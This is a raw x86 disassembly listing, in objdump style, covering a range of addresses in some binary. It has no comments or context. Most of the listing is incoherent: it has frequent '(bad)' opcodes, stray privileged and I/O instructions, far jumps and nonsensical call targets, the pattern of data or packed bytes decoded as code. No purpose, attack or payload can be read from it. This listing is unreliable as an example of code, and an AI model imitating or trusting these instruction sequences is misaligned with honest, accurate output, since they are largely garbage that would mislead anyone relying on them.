  432d98:	mov    eax,edi
  432d9a:	or     BYTE PTR [edx],cl
  432d9c:	shl    cl,cl
  432d9e:	icebp  
  432d9f:	add    BYTE PTR [ebp+0x39],0x8b
  432da3:	or     BYTE PTR [edx+eax*2],cl
  432da6:	(bad)  
  432da7:	or     cl,dh
  432da9:	stc    
  432daa:	shl    DWORD PTR [ebp-0x30],0xc6
  432dae:	xor    al,0x0
  432db0:	inc    ebp
  432db1:	xchg   BYTE PTR [ebx],al
  432db3:	add    esp,edi
  432db5:	add    BYTE PTR [ebp-0x39],cl
  432db8:	mov    al,bl
  432dba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dc0:	sub    al,0xbf
  432dc2:	jmp    0x432d49
  432dc4:	mov    edi,eax
  432dc6:	lock jge 0x432dba
  432dc9:	lea    esi,[edx-0x74bad501]
  432dcf:	mov    ebp,esp
  432dd1:	or     cl,dh
  432dd3:	leave  
  432dd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432ddb:	dec    ebp
  432ddc:	dec    ebp
  432ddd:	test   DWORD PTR [ebx],eax
  432ddf:	paddb  mm6,mm0
  432de2:	add    DWORD PTR [eax],eax
  432de4:	dec    ebp
  432de5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432deb:	mov    esi,DWORD PTR [edx]
  432ded:	or     al,0x2b
  432def:	dec    ebp
  432df0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432df6:	mov    esp,eax
  432df8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dff:	mov    DWORD PTR [ebx],ebp
  432e01:	call   0xc76b731
  432e06:	mov    DWORD PTR [ebp+0x10],ecx
  432e09:	(bad)  
  432e0a:	push   0x8b85ff10
  432e0f:	clc    
  432e10:	or     al,0x53
  432e12:	(bad)  
  432e13:	push   ecx
  432e14:	retf   
  432e15:	mov    ebx,0xff4d8dc8
  432e1a:	mov    DWORD PTR [ebp+0x8],eax
  432e1d:	xor    eax,DWORD PTR [ebp-0x75]
  432e20:	cmp    ebp,DWORD PTR [ebx]
  432e22:	lsl    ebx,WORD PTR [edi-0x8]
  432e26:	call   DWORD PTR [ebx-0x741bff75]
  432e2c:	(bad)  
  432e2d:	or     al,0x5b
  432e2f:	dec    ebp
  432e30:	or     BYTE PTR [ebx],dh
  432e32:	inc    ebp
  432e33:	xor    esi,DWORD PTR ds:0x708088d
  432e39:	in     eax,0x9a
  432e3b:	add    BYTE PTR [edx],dh
  432e3d:	inc    ebp
  432e3e:	pop    edi
  432e3f:	xor    eax,edx
  432e41:	test   DWORD PTR [eax],0x81108b8b
  432e47:	dec    ebp
  432e48:	sub    al,0x33
  432e4a:	add    BYTE PTR [ebx],dh
  432e4c:	push   esi
  432e4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e53:	mov    edi,eax
  432e55:	or     BYTE PTR [ebp+0x45],al
  432e58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e5e:	xor    eax,0xc7069cc9
  432e63:	inc    ebp
  432e64:	cld    
  432e65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432e6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432e72:	in     al,0x4d
  432e74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432e7a:	aad    0xe9
  432e7c:	xlat   BYTE PTR ds:[ebx]
  432e7d:	rol    bh,cl
  432e7f:	mov    edx,esp
  432e81:	or     BYTE PTR [ebp+0x4588f84d],al
  432e87:	mov    ecx,DWORD PTR [eax]
  432e89:	or     BYTE PTR [eax],al
  432e8b:	push   ebp
  432e8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e92:	dec    ebp
  432e93:	enter  0xceba,0x8
  432e97:	retf   0x1807
  432e9a:	ret    0x9a4d
  432e9d:	mov    esi,DWORD PTR [edx]
  432e9f:	or     al,0x33
  432ea1:	into   
  432ea2:	add    edx,esi
  432ea4:	add    ecx,edx
  432ea6:	bswap  eax
  432ea8:	ror    esi,0x98
  432eab:	dec    ebp
  432eac:	add    cl,ch
  432eae:	mov    edi,edi
  432eb0:	hlt    
  432eb1:	inc    esi
  432eb3:	inc    ebp
  432eb4:	ret    0x4533
  432eb7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ebd:	or     BYTE PTR [ebx],dh
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432ec6:	jne    0xff8d2e8d
  432ecc:	inc    ebp
  432ecd:	inc    ebp
  432ece:	mov    esi,DWORD PTR [ebx]
  432ed0:	clc    
  432ed1:	pop    esi
  432ed2:	ret    0xcaeb
  432ed5:	mov    eax,esi
  432ed7:	call   0x520482aa
  432edc:	dec    ebp
  432edd:	add    eax,0xf8728b
  432ee2:	adc    eax,0xce0ccac9
  432ee7:	push   ebp
  432ee8:	ret    0xc6ec
  432eeb:	in     al,dx
  432eec:	call   0x33437bf5
  432ef1:	push   edi
  432ef2:	add    edi,eax
  432ef4:	xor    eax,eax
  432ef6:	jmp    0x432f3d
  432ef8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432efe:	add    eax,edi
  432f00:	shr    eax,cl
  432f02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f08:	mov    esi,DWORD PTR [esp+ebp*8]
  432f0b:	pushf  
  432f0c:	ret    0x84c7
  432f0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432f15:	inc    ebp
  432f16:	in     al,dx
  432f17:	xor    eax,0xc78b9c45
  432f1c:	cld    
  432f1d:	fmul   st(2),st
  432f1f:	sbb    dl,al
  432f21:	jmp    0x9c3b:0x364d45c1
  432f28:	jbe    0x432ef1
  432f2a:	mov    esp,eax
  432f2c:	clc    
  432f2d:	add    BYTE PTR [ebp+0x0],cl
  432f30:	mov    ecx,ecx
  432f32:	lea    eax,[ebp-0x5]
  432f35:	mov    edi,edi
  432f37:	call   0x51ce8281
  432f3c:	hlt    
  432f3d:	xor    eax,edx
  432f3f:	mov    esi,0x9a7284
  432f44:	xor    cl,dl
  432f46:	mov    esi,eax
  432f48:	hlt    
  432f49:	into   
  432f4a:	inc    ebp
  432f4b:	scas   eax,DWORD PTR es:[edi]
  432f4c:	mov    ebp,ecx
  432f4e:	cld    
  432f4f:	add    dl,cl
  432f51:	add    dl,al
  432f53:	inc    ebp
  432f54:	shr    DWORD PTR [ebx],0x4d
  432f57:	xor    edi,DWORD PTR [ebx]
  432f59:	mov    DWORD PTR [edi],ecx
  432f5b:	clc    
  432f5c:	dec    esi
  432f5d:	inc    ebp
  432f5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f64:	ret    0xc6ca
  432f67:	mov    BYTE PTR [ebp-0x32],0x53
  432f6b:	scas   eax,DWORD PTR es:[edi]
  432f6c:	inc    ebp
  432f6d:	jmp    0x432fa5
  432f6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f76:	pop    ebx
  432f77:	xor    ecx,DWORD PTR [ebp+0x3]
  432f7a:	mov    eax,DWORD PTR [ebx]
  432f7c:	clc    
  432f7d:	test   edx,ecx
  432f7f:	mov    ecx,esi
  432f81:	cld    
  432f82:	call   0x8ab774cc
  432f87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f93:	fdiv   QWORD PTR [ebx]
  432f95:	retf   0xce89
  432f98:	in     al,0xc1
  432f9a:	inc    ebp
  432f9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fa1:	into   
  432fa2:	mov    dh,0xc1
  432fa5:	call   0x8c17752e
  432faa:	(bad)  
  432fab:	cld    
  432fac:	mov    ecx,DWORD PTR [ebp-0x14]
  432faf:	xor    eax,ecx
  432fb1:	lea    eax,[ebp+0x8]
  432fb4:	mov    esi,DWORD PTR [edx-0x4]
  432fb7:	add    dl,al
  432fb9:	inc    ebp
  432fba:	mov    esp,0x32d89a8b
  432fbf:	dec    ebp
  432fc0:	mov    esi,DWORD PTR [ebx]
  432fc2:	cld    
  432fc3:	xor    eax,edx
  432fc5:	sub    esp,DWORD PTR [esi-0x75]
  432fc8:	int    0xec
  432fca:	sub    ecx,eax
  432fcc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fd2:	mov    esi,esp
  432fd4:	call   0x34177d5d
  432fd9:	inc    DWORD PTR [ebx]
  432fdb:	mov    edi,DWORD PTR [ebx]
  432fdd:	cld    
  432fde:	jne    0x43302d
  432fe0:	mov    esi,DWORD PTR [ebx]
  432fe2:	aam    0x8d
  432fe4:	dec    ebp
  432fe5:	or     BYTE PTR [ebx],dh
  432fe7:	jb     0x432fec
  432fe9:	add    BYTE PTR [edi+0x45],bl
  432fec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ff3:	xor    ebp,esp
  432ff5:	xor    eax,edi
  432ff7:	sub    edi,esp
  432ff9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432fff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433006:	inc    ebp
  433007:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43300d:	clc    
  43300e:	mov    eax,edi
  433010:	nop
  433011:	fadd   QWORD PTR [eax]
  433013:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433019:	jmp    0x432fa4
  43301b:	mov    eax,DWORD PTR [ecx]
  43301d:	fadd   DWORD PTR [eax]
  43301f:	inc    ebp
  433020:	or     DWORD PTR [ebx],esi
  433022:	dec    eax
  433023:	add    edx,DWORD PTR [ebx-0x2d]
  433026:	dec    ebp
  433027:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43302d:	inc    ebp
  43302e:	push   ebx
  43302f:	mov    dl,BYTE PTR [ecx-0xd]
  433032:	xor    ecx,DWORD PTR [ebp-0x45]
  433035:	(bad)  
  433037:	rol    BYTE PTR [eax],0xc1
  43303a:	ret    
  43303b:	inc    ebp
  43303c:	inc    ebp
  43303d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433043:	xor    eax,ebx
  433045:	add    eax,DWORD PTR [ebp+0x23]
  433048:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43304e:	cmp    edi,0xc
  433051:	dec    ebp
  433052:	inc    ebp
  433053:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433059:	inc    ebp
  43305a:	mov    esi,DWORD PTR [ebx]
  43305c:	clc    
  43305d:	lea    eax,[ebp+0x45725407]
  433063:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433067:	xor    edi,DWORD PTR [eax]
  433069:	mov    ecx,0xff8b8d4d
  43306e:	push   esp
  43306f:	enter  0x4df7,0x23
  433073:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	loopne 0x433068
  43307d:	ret    0xc68b
  433080:	push   esp
  433081:	enter  0x9745,0x8b
  433085:	inc    ebp
  433086:	cld    
  433087:	mov    eax,edi
  433089:	clc    
  43308a:	ret    
  43308b:	ret    0xc645
  43308e:	mov    esi,DWORD PTR [ebx]
  433090:	cld    
  433091:	pop    esi
  433092:	mov    ebx,0x83458bc3
  433098:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43309c:	dec    ebp
  43309d:	xor    eax,0xba039c33
  4330a2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  4330a8:	inc    ebp
  4330a9:	mov    edi,DWORD PTR [ebx]
  4330ab:	adc    al,0x9c
  4330ad:	inc    ebp
  4330ae:	(bad)  
  4330af:	mov    ebx,eax
  4330b1:	adc    al,0x85
  4330b3:	cmp    al,0x1
  4330b6:	inc    ebp
  4330b7:	add    BYTE PTR [ecx],bh
  4330b9:	dec    ebp
  4330ba:	pushf  
  4330bb:	mov    ebp,ecx
  4330bd:	mov    eax,DWORD PTR [ebx]
  4330bf:	nop
  4330c0:	add    BYTE PTR [eax],al
  4330c2:	inc    ebp
  4330c3:	mov    esi,DWORD PTR [ebx]
  4330c5:	add    eax,DWORD PTR [ebx]
  4330c7:	cmp    al,0x89
  4330c9:	mov    esp,esi
  4330cb:	clc    
  4330cc:	inc    ebp
  4330cd:	inc    ebp
  4330ce:	add    edx,DWORD PTR [esi+0xc]
  4330d1:	mov    edi,0x7ff0845
  4330d6:	in     al,dx
  4330d7:	(bad)  
  4330d8:	jne    0x433074
  4330da:	mov    esi,DWORD PTR [edx]
  4330dc:	clc    
  4330dd:	add    ebp,DWORD PTR [esi]
  4330df:	mov    edi,edi
  4330e1:	in     al,dx
  4330e2:	mov    DWORD PTR [ebp-0x10],eax
  4330e5:	xor    eax,DWORD PTR [ebp+0x3]
  4330e8:	cmp    eax,0x8bf49c89
  4330ed:	inc    ebp
  4330ee:	fmul   DWORD PTR [ebx-0x173caf39]
  4330f4:	lea    ecx,[ecx+0x45e8d4bc]
  4330fa:	clc    
  4330fb:	mov    edi,edi
  4330fd:	cmp    BYTE PTR [ebp+0x4d],al
  433100:	test   DWORD PTR [eax+0x74],ecx
  433103:	inc    ecx
  433104:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43310a:	ret    
  43310b:	inc    eax
  43310c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433112:	push   eax
  433113:	dec    eax
  433114:	test   al,0xd0
  433116:	dec    eax
  433118:	mov    eax,DWORD PTR [ebp-0x14]
  43311b:	mov    eax,DWORD PTR [ebp+0x38]
  43311e:	mov    eax,ecx
  433120:	fadd   DWORD PTR [ebx]
  433122:	dec    ebp
  433123:	inc    eax
  433124:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43312a:	inc    ebp
  43312b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433131:	fadd   QWORD PTR [ebx]
  433133:	inc    ebp
  433134:	or     al,0x33
  433136:	dec    ebp
  433137:	add    edi,DWORD PTR [ebx]
  433139:	mov    DWORD PTR [edx-0x28],esi
  43313c:	mov    eax,DWORD PTR [ebp-0x10]
  43313f:	mov    eax,DWORD PTR [eax+0x10]
  433142:	mov    eax,edi
  433144:	lock ret 
  433146:	inc    ecx
  433147:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43314d:	fsubr  st,st(5)
  43314f:	test   DWORD PTR [eax],eax
  433151:	clc    
  433152:	push   0x45
  433154:	(bad)  
  433155:	cmp    ch,ah
  433157:	pushf  
  433158:	inc    ebp
  433159:	(bad)  
  43315a:	push   eax
  43315b:	fsub   DWORD PTR [eax-0x7b]
  43315e:	(bad)  
  43315f:	clc    
  433160:	mov    eax,0xf8008584
  433165:	mov    eax,DWORD PTR [ebp-0x4]
  433168:	mov    edi,0x4585c3cc
  43316e:	clc    
  43316f:	mov    eax,DWORD PTR [ebp+0x14]
  433172:	cmp    eax,DWORD PTR [ebp-0x64]
  433175:	mov    edi,eax
  433177:	in     al,dx
  433178:	les    esi,FWORD PTR [ebp-0x7b]
  43317b:	mov    edi,eax
  43317d:	or     al,0x4d
  43317f:	dec    ebp
  433180:	mov    eax,ebp
  433182:	in     al,0xf2
  433184:	dec    ebp
  433185:	dec    DWORD PTR [ecx+0x4dc7e045]
  43318b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433191:	inc    ebp
  433192:	mov    DWORD PTR [ebx],esi
  433194:	fadd   QWORD PTR [ebx]
  433196:	dec    ebp
  433197:	push   eax
  433198:	xor    eax,DWORD PTR [ebp+0x3]
  43319b:	push   eax
  43319c:	mov    DWORD PTR [eax+ebx*8],ebx
  43319f:	push   esi
  4331a1:	mov    eax,DWORD PTR [eax]
  4331a3:	lock cmp eax,0xf84e85c0
  4331a9:	inc    ebp
  4331aa:	test   BYTE PTR [ebx],dh
  4331ac:	add    DWORD PTR [ebx],eax
  4331ae:	add    BYTE PTR [eax+0x4d],dl
  4331b1:	jne    0x4331e6
  4331b3:	lea    ecx,[ebx-0x7617fc44]
  4331b9:	div    ah
  4331bb:	inc    DWORD PTR [ebp+0x45]
  4331be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4331c4:	jb     0x433151
  4331c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4331cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4331d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331d3:	mov    edi,DWORD PTR [ebx]
  4331d5:	adc    BYTE PTR [ebp+0x41],dh
  4331d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331de:	ret    
  4331df:	push   ss
  4331e0:	push   0x45
  4331e2:	lea    ecx,[ebx+0x4de80cb0]
  4331e8:	sti    
  4331e9:	add    edi,edi
  4331eb:	or     BYTE PTR [ebp+0x4d],al
  4331ee:	mov    ebp,DWORD PTR [ebx]
  4331f0:	xor    ebp,ecx
  4331f2:	mov    al,BYTE PTR [edx]
  4331f4:	add    eax,0xc7200
  4331f9:	jne    0x433248
  4331fb:	lea    esi,[ebx]
  4331fd:	mov    al,0xf
  4331ff:	call   0xf28c4
  433204:	shl    DWORD PTR ds:0x89019c84,0x0
  43320b:	rol    BYTE PTR [ebp+0x45],1
  43320e:	mov    esi,DWORD PTR [ebx+esi*1]
  433211:	pushf  
  433212:	mov    al,bh
  433214:	add    eax,0x8572c8
  433219:	clc    
  43321a:	dec    ebp
  43321b:	inc    ebp
  43321c:	xor    edi,DWORD PTR [edx]
  43321e:	setl   al
  433221:	(bad)  
  433222:	retf   
  433223:	rol    cl,1
  433225:	dec    ebp
  433226:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43322c:	inc    ebp
  43322d:	lea    ecx,[ebx-0x75b2cc38]
  433233:	lea    eax,ds:0x4d72c4
  433239:	mov    ecx,DWORD PTR [ebp-0x4]
  43323c:	xor    ecx,edi
  43323e:	bswap  ebx
  433240:	ror    BYTE PTR [ebp-0x35],0xe9
  433244:	rol    DWORD PTR [ecx],0x84
  433247:	add    BYTE PTR [ecx],al
  433249:	cmp    eax,DWORD PTR [eax]
  43324b:	pushf  
  43324c:	inc    ebp
  43324d:	jnp    0x8a436650
  433253:	mov    eax,DWORD PTR ds:0xcf72e8
  433259:	lock dec ebp
  43325b:	retf   
  43325c:	xor    ecx,DWORD PTR [ebp+0xf]
  43325f:	mov    eax,eax
  433261:	fmul   st,st(3)
  433263:	test   ecx,0x19a8484
  433269:	xor    al,BYTE PTR [eax]
  43326b:	mov    DWORD PTR [ebp-0x28],eax
  43326e:	mov    eax,DWORD PTR [ebp+0x33]
  433271:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433277:	ret    
  433278:	add    al,cl
  43327a:	dec    ebp
  43327b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433281:	add    ecx,DWORD PTR ds:0xc7250
  433287:	inc    ebp
  433288:	rcl    DWORD PTR [eax+0x4d],0x2b
  43328c:	mov    edi,edi
  43328e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433294:	jb     0x43325d
  433296:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43329d:	mov    esi,DWORD PTR [ebx]
  43329f:	cld    
  4332a0:	mov    cl,bh
  4332a2:	or     eax,0x372b6
  4332a7:	cmp    ecx,eax
  4332a9:	jne    0x433326
  4332af:	mov    eax,DWORD PTR [ebp-0x20]
  4332b2:	mov    eax,DWORD PTR [eax]
  4332b4:	xor    eax,edi
  4332b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4332bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332c0:	mov    ecx,edi
  4332c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332c8:	jb     0x4332d9
  4332ca:	add    BYTE PTR [edi-0x3f],dl
  4332cd:	add    BYTE PTR [ebp-0x75],cl
  4332d0:	mov    esi,eax
  4332d2:	xor    eax,DWORD PTR [eax]
  4332d4:	mov    al,bh
  4332d6:	or     eax,0x4a7284
  4332db:	xor    al,cl
  4332dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332e0:	mov    ecx,edi
  4332e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332e8:	jb     0x4332f9
  4332ea:	add    BYTE PTR [edi],dh
  4332ec:	enter  0x8500,0x8b
  4332f0:	add    ah,bl
  4332f2:	add    BYTE PTR [eax],al
  4332f4:	inc    ebp
  4332f5:	(bad)  
  4332f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4332fd:	mov    esi,DWORD PTR [edx-0x4]
  433300:	add    bh,cl
  433302:	dec    ebp
  433303:	mov    dh,0x8b
  433305:	add    esi,DWORD PTR [ebx]
  433307:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43330d:	add    BYTE PTR [eax],al
  43330f:	mov    eax,ecx
  433311:	loopne 0x433360
  433313:	add    BYTE PTR [ebx-0x757bcc39],cl
  433319:	dec    edx
  43331a:	or     eax,0x8b7232
  43331f:	in     al,0xc1
  433321:	or     DWORD PTR [ebp-0x31],ecx
  433324:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43332b:	xor    dh,BYTE PTR [edx-0x75]
  43332e:	add    al,dh
  433330:	enter  0x4f09,0xcf
  433334:	inc    ebp
  433335:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43333b:	or     al,BYTE PTR ds:0xe4728b
  433341:	or     DWORD PTR [ebp-0x31],ecx
  433344:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43334b:	cmp    dh,BYTE PTR [edx+0xf]
  43334e:	add    bl,dl
  433350:	rol    DWORD PTR [eax],0x4d
  433353:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433359:	(bad)  
  43335a:	or     eax,0x4a7284
  43335f:	xor    al,cl
  433361:	mov    ecx,DWORD PTR [ebp-0x20]
  433364:	mov    ecx,DWORD PTR [ecx]
  433366:	xor    ecx,edi
  433368:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43336f:	xor    cl,al
  433371:	mov    ecx,DWORD PTR [edi]
  433373:	fadd   QWORD PTR [ebp+0x9]
  433376:	call   0xffd02e4a
  43337b:	dec    edx
  43337c:	dec    ebp
  43337d:	xor    bh,BYTE PTR [ebx]
  43337f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433383:	loopne 0x433381
  433385:	or     edi,eax
  433387:	iret   
  433388:	ret    
  433389:	mov    WORD PTR [ebp+0x4e],es
  43338c:	mov    esi,DWORD PTR [edx]
  43338e:	call   0x8452facd
  433393:	(bad)  
  433394:	call   0x8bdc:0x338b3200
  43339b:	add    ah,bh
  43339d:	(bad)  
  43339e:	push   ebp
  43339f:	test   BYTE PTR [ebx],dh
  4333a1:	dec    edx
  4333a2:	add    esi,DWORD PTR [edx]
  4333a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333aa:	dec    edi
  4333ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4333b3:	xor    al,BYTE PTR [ebx]
  4333b5:	mov    edi,DWORD PTR [ebx]
  4333b7:	in     al,0x75
  4333b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333bf:	dec    edx
  4333c0:	xor    esi,DWORD PTR [edx]
  4333c2:	lea    ecx,[edx]
  4333c4:	or     BYTE PTR [ebx+0x900f072],cl
  4333ca:	ja     0x43339b
  4333cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4333d3:	cmp    ch,al
  4333d5:	jne    0x4333ca
  4333d7:	mov    edi,edi
  4333d9:	fadd   QWORD PTR [ebp+0x0]
  4333dc:	mov    eax,edi
  4333de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4333e5:	mov    edx,DWORD PTR [ebx]
  4333e7:	in     al,0x45
  4333e9:	or     DWORD PTR [ebx],esi
  4333eb:	iret   
  4333ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4333f3:	xor    dl,BYTE PTR [eax-0x75]
  4333f6:	sbb    al,0xe0
  4333f8:	dec    DWORD PTR [ecx]
  4333fa:	mov    ecx,edi
  4333fc:	in     al,dx
  4333fd:	mov    eax,es
  4333ff:	dec    edx
  433400:	mov    DWORD PTR [edx],esi
  433402:	fmul   QWORD PTR [edx]
  433404:	jne    0x433391
  433406:	(bad)  
  433407:	(bad)  
  433409:	or     DWORD PTR [ebp-0x31],eax
  43340c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433413:	cmp    bh,bh
  433415:	jne    0x43345c
  433417:	lea    ecx,[ebx-0x38372750]
  43341d:	inc    ebx
  43341f:	mov    eax,ecx
  433421:	mov    eax,0xa00c111
  433426:	jne    0x43346d
  433428:	mov    esi,DWORD PTR [ebx]
  43342a:	test   al,0x3
  43342c:	inc    ebp
  43342d:	mov    DWORD PTR [eax-0xc],edx
  433430:	loop   0x433477
  433432:	push   DWORD PTR [ebx]
  433434:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43343a:	add    DWORD PTR [eax],eax
  43343c:	mov    eax,edi
  43343e:	lods   al,BYTE PTR ds:[esi]
  43343f:	dec    ebp
  433440:	inc    ebp
  433441:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433447:	retf   
  433448:	mov    edx,ecx
  43344a:	adc    al,0x84
  43344c:	(bad)  
  43344d:	std    
  43344e:	ret    
  43344f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433455:	hlt    
  433456:	rol    edi,0x82
  433459:	ret    
  43345a:	cld    
  43345b:	enter  0x11ff,0x45
  43345f:	inc    ebp
  433460:	pop    edi
  433461:	mov    ebx,DWORD PTR [ebx+0x14]
  433464:	ret    0xc7
  433467:	test   BYTE PTR [ebx+0x4532519a],cl
  43346d:	jmp    0x4333fa
  43346f:	push   0x8
  433471:	call   DWORD PTR [esi]
  433473:	in     al,dx
  433474:	add    BYTE PTR [ebp+0x1],0x50
  433478:	add    bh,ah
  43347a:	add    bh,bh
  43347c:	icebp  
  43347d:	mov    ecx,DWORD PTR [eax]
  43347f:	cld    
  433480:	pop    es
  433481:	dec    ebp
  433482:	shl    DWORD PTR [ebx],0x72
  433485:	add    eax,DWORD PTR [eax]
  433487:	cmp    edx,ecx
  433489:	je     0x43349b
  43348b:	mov    esi,DWORD PTR [ebp-0x4]
  43348e:	inc    edi
  433490:	or     al,0xc3
  433492:	jmp    FWORD PTR [edx-0x18]
  433495:	(bad)  
  433496:	sti    
  433497:	cwde   
  433498:	(bad)  
  433499:	call   0xffa12da4
  43349e:	or     al,0x45
  4334a0:	push   ebp
  4334a1:	sub    esp,0x18
  4334a4:	push   ebx
  4334a5:	inc    ebp
  4334a6:	mov    edi,edi
  4334a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334af:	test   al,0x53
  4334b1:	inc    ebp
  4334b2:	push   ecx
  4334b3:	push   eax
  4334b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334ba:	add    ah,bh
  4334bc:	(bad)  
  4334bd:	dec    ebp
  4334be:	add    DWORD PTR [ebx],esi
  4334c0:	inc    ebp
  4334c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4334c7:	push   0xffffff8b
  4334c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4334cf:	add    eax,DWORD PTR [ecx]
  4334d1:	or     BYTE PTR [eax],al
  4334d3:	call   0xff852cd8
  4334d8:	mov    eax,DWORD PTR [ebp+0x14]
  4334db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334e1:	inc    ebp
  4334e2:	dec    ecx
  4334e3:	add    ebp,DWORD PTR [edx+0x14]
  4334e6:	push   0x8b3045
  4334eb:	call   0x33ad8260
  4334f0:	inc    DWORD PTR [ebx]
  4334f2:	mov    DWORD PTR [edi],ecx
  4334f4:	mov    eax,ecx
  4334f6:	or     BYTE PTR [ebp-0x3d],cl
  4334f9:	cmp    eax,edi
  4334fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433500:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433506:	adc    al,0xc9
  433508:	inc    ebp
  433509:	adc    BYTE PTR [eax+0x55],dl
  43350c:	jne    0x4334fa
  43350e:	call   0xff54349e
  433513:	dec    ebp
  433514:	inc    ebp
  433515:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43351b:	add    BYTE PTR [ebx],bh
  43351d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433521:	push   ebx
  433522:	or     al,0x51
  433524:	dec    ebp
  433525:	xor    DWORD PTR [ebx],0xf32039a
  43352b:	cmp    eax,DWORD PTR [ebp+0x74]
  43352e:	mov    edi,edi
  433530:	pop    edi
  433531:	adc    BYTE PTR [ebx+0x75],bl
  433534:	ret    0x50
  433537:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43353b:	(bad)  
  43353c:	clc    
  43353d:	mov    esp,ebp
  43353f:	pop    ecx
  433540:	mov    ecx,0xf80085c2
  433545:	mov    ecx,DWORD PTR [ecx+edx*2]
  433548:	push   esi
  433549:	push   esi
  43354a:	(bad)  
  43354b:	lock inc DWORD PTR [ebp+0x44]
  43354f:	mov    edx,DWORD PTR [eax]
  433551:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433555:	or     BYTE PTR [ebx+0x7],dl
  433558:	push   ecx
  433559:	ret    
  43355a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433560:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433566:	or     al,0x80
  433568:	jge    0x43356b
  43356a:	mov    DWORD PTR [eax],eax
  43356c:	and    al,0x8
  43356e:	cmp    DWORD PTR [ebp+0x10],eax
  433571:	mov    edx,DWORD PTR [esi]
  433573:	xchg   esp,eax
  433574:	dec    esp
  433575:	add    BYTE PTR [eax],dl
  433577:	mov    ecx,edx
  433579:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43357d:	dec    ebp
  43357e:	into   
